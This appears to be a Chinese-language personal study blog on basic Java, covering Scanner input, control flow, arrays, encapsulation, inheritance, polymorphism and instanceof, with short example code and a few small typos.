<h2 id="JavaDoc"><a href="#JavaDoc" class="headerlink" title="JavaDoc"></a>JavaDoc</h2><p><code>javadoc -encoding UTF-8 -charset UTF-8 文件名.java</code></p>
<h2 id="Java流程控制"><a href="#Java流程控制" class="headerlink" title="Java流程控制"></a>Java流程控制</h2><h3 id="Scanner对象"><a href="#Scanner对象" class="headerlink" title="Scanner对象"></a>Scanner对象</h3><blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<p>作用：通过Scanner类获取用户输入。    <del>人不人鬼不鬼的注释</del></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	基础语法</span>
	<span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//	举例</span>
<span class="token class-name">Scanner</span> scanner1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Use next() to receive:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//determine user's input</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>scanner1<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//use next() to receive</span>
            <span class="token class-name">String</span> str <span class="token operator">=</span> scanner1<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user's input was:"</span> <span class="token operator">+</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//close scanner1 when finished</span>
        scanner1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>next()</p>
<blockquote>
<p>一定要读取到有效字符才可结束输入；</p>
<p>输入有效字符前的空白，next()会将其自动去除；</p>
<p>输入有效字符后才将后面的空白作为分隔符或结束符；</p>
<p><strong>next()不能得到含有空格的字符串。</strong></p>
</blockquote>
</li>
<li><p>nextLine()</p>
<blockquote>
<p>以<strong>’回车‘</strong>为结束符，即其返回输入回车前的所有字符；</p>
<p>可以获得空白。</p>
</blockquote>
</li>
</ul>
<p>读取前，判断是否有字符输入：</p>
<ul>
<li>hasNext()</li>
<li>hasNextLine()</li>
</ul>
<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>···<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    ···
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">&#123;</span>
    ···
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">&#123;</span>
    ···
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">&#123;</span>
    ···
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    ···
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	switch</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span>···<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//	JDK7以后，支持String类型，反编译,字节码文件，对应hashCode()</span>
            <span class="token keyword">case</span> value<span class="token operator">:</span>
                <span class="token comment">//语句</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token comment">//可选</span>
            <span class="token keyword">case</span> value<span class="token operator">:</span>
                <span class="token comment">//语句</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token comment">//可选 ，不写便有可能执行，出现case穿透现象  </span>
            <span class="token keyword">default</span><span class="token operator">:</span>    <span class="token comment">//可选</span>
                <span class="token comment">//语句</span>
        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	快捷键 34.fori</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            
        <span class="token punctuation">&#125;</span>
<span class="token comment">//	快捷键 45.forr</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            
        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	增强型for循环</span>
<span class="token keyword">int</span> num<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> num<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     					<span class="token comment">//num.for，取出num里面的数赋值给'i'</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token comment">//正序输出</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> num<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>	<span class="token comment">//num.forr，逆序flag可能会用到</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token comment">//逆序输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="break与continue"><a href="#break与continue" class="headerlink" title="break与continue"></a>break与continue</h3><ul>
<li><code>break</code></li>
</ul>
<blockquote>
<p><strong>强行退出</strong>循环，不执行循环中的循环语句</p>
</blockquote>
<p><del>爷不玩了，怒</del></p>
<ul>
<li><code>continue</code></li>
</ul>
<blockquote>
<p>用于终止<strong>某次</strong>循环过程</p>
</blockquote>
<p><del>哄哄我咱们继续</del></p>
<ul>
<li><code>goto</code>（x）标签Lable</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">outer<span class="token operator">:</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">150</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>		<span class="token comment">//outer标签所在处</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span> outer<span class="token punctuation">;</span>					<span class="token comment">//跳转到outer标签处</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//打印三角形</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>@<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>@@@<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>@@@@@<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span class="token operator">*</span><span class="token operator">*</span>@@@@@@@<span class="token operator">*</span><span class="token operator">*</span>
<span class="token operator">*</span>@@@@@@@@@<span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>debug</p>
<h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><blockquote>
<p>允许在调用方法时传入不定长度的参数。变长参数是 Java 的一个语法糖，本质上还是基于数组的实现：</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>可变参数只能作为函数的最后一个参数，但其前面可以有也可以没有任何其他参数</li>
<li>由于可变参数必须是最后一个参数，所以一个函数最多只能有一个可变参数</li>
<li>Java的可变参数，会被编译器转型为一个数组</li>
</ul>
<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	数组本身是在堆中的</span>
<span class="token keyword">int</span> arr1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> num<span class="token punctuation">;</span>			<span class="token comment">//1.声明	优先选用</span>
num <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//2.创建</span>
<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//数组长度获取：arr.length()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><ul>
<li><p>静态初始化</p>
<ul>
<li>```java<br>int[] arr = {1,2,3};<pre class="line-numbers language-none"><code class="language-none">
- 动态初始化

  - &#96;&#96;&#96;java
    int[] arrb &#x3D; new int[10];
    b[0] &#x3D; 10;	&#x2F;&#x2F;其余皆0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ul>
<p><del>困了</del></p>
<hr>
<h1 id="Java-Day-003"><a href="#Java-Day-003" class="headerlink" title="Java_Day_003"></a>Java_Day_003</h1><h2 id="数组使用"><a href="#数组使用" class="headerlink" title="数组使用"></a>数组使用</h2><ul>
<li>For-Each循环</li>
</ul>
<ul>
<li>数组作方法入参</li>
</ul>
<ul>
<li>数组作返回值</li>
</ul>
<h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p><code>int[][] arr=&#123;&#125;;</code></p>
<h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><h3 id="静态方法：static"><a href="#静态方法：static" class="headerlink" title="静态方法：static"></a>静态方法：static</h3><blockquote>
<p>是和类一起加载的；</p>
<p>可以通过 <code>类名.方法名</code> 直接调用；</p>
<p>例如：Student.say();</p>
</blockquote>
<p>如果是非静态方法，即不加<code>static</code>，则无法直接调用，需要实例化（类实例化后才存在）：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Student</span> stu <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
student<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h2 id="构造器详解"><a href="#构造器详解" class="headerlink" title="构造器详解"></a>构造器详解</h2><ul>
<li>和类名相同</li>
<li>没有返回值</li>
</ul>
<hr>
<h1 id="Java-Day-004"><a href="#Java-Day-004" class="headerlink" title="Java_Day_004"></a>Java_Day_004</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>（数据的隐藏）</p>
<p>属性私有private，<code>get/set</code> 。</p>
<p>提供一些public的get/set方法。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//属性私有</span>
<span class="token keyword">private</span> <span class="token keyword">int</span> studentId<span class="token punctuation">;</span>
<span class="token comment">//get 获得这个数据</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getStudentId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>studentId<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//set 给这个数据设置值</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentId</span><span class="token punctuation">(</span><span class="token keyword">int</span> studentId<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>studentId <span class="token operator">=</span> studentId<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/**
* 生成get、set函数的快捷方式：alt+fn+insert，
* 然后选择对应的Getter/Setter，最后选择要操作的参数。
*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><blockquote>
<p>关键词：<code>extends</code>，扩展。无法继承 <code>final</code> 修饰的类。</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>在 Java 中，所有的类，都默认直接或者间接继承 <strong>Object</strong> 类。</p>
<p>在 Java 中，只有单继承，没有多继承，即只能继承一个父类。</p>
<p>但一个父类可以有很多子类。</p>
</blockquote>
<h3 id="super"><a href="#super" class="headerlink" title="super"></a>super</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//函数传入的name参数</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//函数所在该类中的name参数</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//函数所在类的父类的name参数</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>不能重写的方法：</p>
<ul>
<li>static：        属于类，不属于实例；</li>
<li>final：          常量；</li>
<li>private：     私有。</li>
</ul>
</br>

<p><strong>测试代码：</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>opp<span class="token punctuation">.</span>demo06</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"per"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>opp<span class="token punctuation">.</span>demo06</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>opp<span class="token punctuation">.</span>demo06<span class="token punctuation">.</span></span><span class="token class-name">Person</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>opp<span class="token punctuation">.</span>demo06<span class="token punctuation">.</span></span><span class="token class-name">Student</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Application</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        
        <span class="token class-name">Student</span> s1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Person</span>  s2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span>  s3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//对象能执行哪些方法，主要看对象左边的类型，和右边关系不大</span>
        s2<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//子类重写了父类的方法，执行子类的方法</span>
        s1<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        s2<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//无法执行，父类中没有定义eat()方法</span>
        <span class="token comment">//想用子类的方法就把他强制转换成子类，如下</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span>s2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//高类型转低类型，输出“ate”</span>
		<span class="token comment">//如果是子类转父类，则可能丢失一些方法</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>（类型转换）引用类型；</p>
<blockquote>
<p>instanceof是Java中的二元运算符，左边是对象，右边是类；当对象是右边类或子类所创建对象时，返回true；否则，返回false。</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">X</span> <span class="token keyword">instanceof</span> <span class="token class-name">Y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true：实例X 与 类Y 之间是父子关系</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Student</span> s1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Person</span>  s2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span>  s3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Person</span>  p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p1 <span class="token keyword">instanceof</span> <span class="token class-name">Student</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//false</span>
  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2 <span class="token keyword">instanceof</span> <span class="token class-name">Student</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//true</span>
  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s3 <span class="token keyword">instanceof</span> <span class="token class-name">Student</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//true</span>
  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1 <span class="token keyword">instanceof</span> <span class="token class-name">Person</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//true</span>
